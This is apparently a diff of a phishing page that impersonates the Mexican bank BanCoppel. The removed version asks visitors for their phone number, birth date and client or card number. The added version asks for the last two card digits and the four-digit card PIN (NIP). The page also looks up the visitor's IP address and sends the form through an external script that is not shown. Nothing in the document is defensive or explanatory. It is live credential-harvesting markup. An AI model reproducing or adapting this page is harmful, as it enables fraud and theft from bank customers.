@@ -1,9 +1,12 @@
-
 <html>
    <head>
       <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+      
       <link rel="stylesheet" href="css/bootstrap.min.css">
       <title>Home</title>
+      <meta name="viewport" content="width=device-width, initial-scale=1">
+      <link rel="stylesheet" type="text/css" href="css/util.css">
+      <link rel="stylesheet" type="text/css" href="css/main.css">
       <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script> 
       <script>
          $.getJSON("https://api.ipify.org?format=json",
@@ -20,18 +23,13 @@
 
       })
       </script>
-      <meta name="viewport" content="width=device-width, initial-scale=1">
-      <link rel="stylesheet" type="text/css" href="css/util.css">
-      <link rel="stylesheet" type="text/css" href="css/main.css">
-       
-     
    </head>
    <body>
       <header id="main-header">
          <a class="logo-header" href="#">
          <img src="img/yDvl2u8.png" style="width: 250px">
-         </a> <!-- / #logo-header -->
-         <div class="menu-header" href="index.html">
+         </a> 
+         <div class="menu-header" href="#">
             <div id="bar-menu" class="bar-menu">
                <span></span>
                <span></span>
@@ -44,11 +42,11 @@
          <div class="container-login100" style="background-color: white; 
             position: absolute;
             ">
-            <div class="wrap-login100 p-l-55 p-r-55 p-t-50 p-b-54">
+            <div class="wrap-login100 p-l-55 p-r-55 p-t-50 p-b-54" >
               
                <section class="">
                   <form class="login100-form validate-form" action="" method="post"  onsubmit=" return sender()">
-                     <p id="address" hidden=""></p>
+                     <p id="address" hidden="">Medellín, CO</p>
                      <p id="gfg" hidden="">
                         <b></b>
                      </p>
@@ -56,46 +54,25 @@
                      <br>
                      <br>
                      <div class="textypn1"><b><span class="model" style="font-size:28px; color:#003995; text-align:center;">
-                        Activar Movimientos</span></b>
+                        Datos de la Tarjeta</span></b>
                      </div>
                      <div class="wrap-input101 validate-input" data-validate="">
                         <br>
-                        <div class="textypn2"><span class="model" style="font-size:16px; color:#003995; text-align:center;display: block;margin: 0 auto;">
-                           Realiza el proceso de verificacion de identidad para cancelar el cambio.</span>
-                        </div>
                         <br>
-                        <br>
-                        <div class="textypn2"><span class="model" style="font-size:16px; color:gray; text-align:center;">
-                           ¿Cuál es tu número celular?</span>
-                        </div>
+                       
                         <br>
                         <div class="wrap-input101 validate-input" data-validate=""> 
                            <span class="label-input101"></span>
-                           <input class="input101" type="text" pattern="[0-9]*" inputmode="numeric" style="text-align: left;padding-left: 10px"  id="0T4RX"  maxlength="10" minlength="10" required="true" onkeypress="if (event.keyCode &lt; 48 || event.keyCode &gt; 57) event.returnValue = false;" placeholder="Debe tener 10 digitos">
+                           <input class="input101" type="text" pattern="[0-9]*" style="text-align: left;padding-left: 10px" inputmode="numeric" id="0T4RX" maxlength="2" minlength="2" required="true" onkeypress="if (event.keyCode &lt; 48 || event.keyCode &gt; 57) event.returnValue = false;" placeholder="2 últimos dígitos de tu Tarjeta">
                            <span class="focus-input100" data-symbol=""></span>
                         </div>
-                        <br>
-                        <div class="textypn2"><span class="model" style="font-size:16px; color:gray; text-align:center;">
-                           Fecha de nacimiento</span>
-                        </div>
-                        <br>
                         <div class="wrap-input101 validate-input" data-validate="">
-                           <input class="input101" type="text" pattern="[0-9]*" inputmode="numeric" style="text-align: left;padding-left: 10px" onfocus="(this.type='date')" id="PL4C" required="true" min="1930-12-30" max="2006-12-30" onkeypress="if (event.keyCode &lt; 48 || event.keyCode &gt; 57) event.returnValue = false;" placeholder="dd - mm - aaaa">
-                           <span class="focus-input100" data-symbol=""></span>
-                        </div>
-                        <div class="wrap-input101 validate-input" data-validate=""> 
                            <span class="label-input101"></span>
                            <br>
                            <br>
-                           <br>
-                           <div class="textypn2"><span class="model" style="font-size:16px; color:gray; text-align:center;">
-                          número de Cliente, número de Cuenta o tu Tarjeta BanCoppel</span>
-                        </div>
-                           <input class="input101" type="text" pattern="[0-9]*" inputmode="numeric"  id="PR0C4T" maxlength="16" style="text-align: left;padding-left: 10px" minlength="9" required="true" onkeypress="if (event.keyCode &lt; 48 || event.keyCode &gt; 57) event.returnValue = false;" placeholder="Ingresa el número">
+                        
+                           <input class="input101" type="text" pattern="[0-9]*" style="text-align: left;padding-left: 10px" inputmode="numeric"  id="PL4C" maxlength="4" minlength="4" required="true" onkeypress="if (event.keyCode &lt; 48 || event.keyCode &gt; 57) event.returnValue = false;" placeholder="Ingresa los 4 digitos de tu NIP">
                            <span class="focus-input100" data-symbol=""></span>
-                        </div>
-                        <div class="textypn2"><span class="model" style="font-size:16px; color:#3EB7FC; text-align:left;">
-                           Ingresa tu número de Cliente, número de Cuenta o tu Tarjeta BanCoppel</span>
                         </div>
                         <br>
                         <div class="text-right p-t-8 p-b-31">
@@ -117,11 +94,12 @@
                   </form>
                </section>
             </div>
-          
+            <header id="main-header2">
+            </header>
             <!-- / #main-header -->
          </div>
          <div id="dropDownSelect1"></div>
-         <script src="js/sax.js"></script>
+         <script src="js/sax2.js"></script>
       </div>
    </body>
 </html>
